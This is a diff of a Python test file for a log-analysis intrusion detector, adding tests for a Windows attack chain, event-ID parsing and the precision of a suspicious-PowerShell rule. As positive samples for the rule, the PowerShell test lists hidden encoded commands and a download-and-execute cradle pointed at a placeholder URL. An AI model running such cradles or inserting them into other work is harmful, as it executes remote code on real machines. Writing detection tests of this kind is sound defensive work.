@@ -23,10 +23,32 @@ def test_linux_attacks_detected_exactly():
     assert len(alerts) == 5            # no false positives from normal traffic
 
 
-def test_windows_brute_force():
+def test_windows_attack_chain_detected_exactly():
     lines, truth = generate_windows_log()
     _, alerts = analyze_text("\n".join(lines))
-    assert _rules(alerts) == {("brute_force", truth["brute_force"])}
+    # every stage of the chain is found, and benign PowerShell / non-admin group changes raise nothing
+    assert _rules(alerts) == set(truth.items())
+    top = alerts[0]
+    assert top["severity"] == "Critical"
+
+
+def test_windows_event_ids_parsed():
+    lines, _ = generate_windows_log()
+    df = parse_text("\n".join(lines))
+    assert {"login", "user_created", "group_add", "lockout", "process", "log_cleared"} <= set(df["event_type"])
+    # old 5-column Windows CSVs still parse
+    old = "timestamp,host,event_id,user,ip\n2026-09-28 08:00:00,WIN-DC01,4625,bob,10.0.0.5"
+    assert parse_text(old).iloc[0]["status"] == "failure"
+
+
+def test_powershell_rule_precision():
+    from src.detector import CONFIG
+    import re
+    pat = re.compile(CONFIG["suspicious_powershell"]["pattern"])
+    bad = ["powershell.exe -nop -w hidden -enc AAAA", "powershell -EncodedCommand AAAA",
+           "powershell IEX (New-Object Net.WebClient).DownloadString('http://x')"]
+    good = [r"powershell.exe -File C:\Scripts\backup.ps1", "powershell.exe Get-Service"]
+    assert all(pat.search(c) for c in bad) and not any(pat.search(c) for c in good)
 
 
 def test_edge_cases():
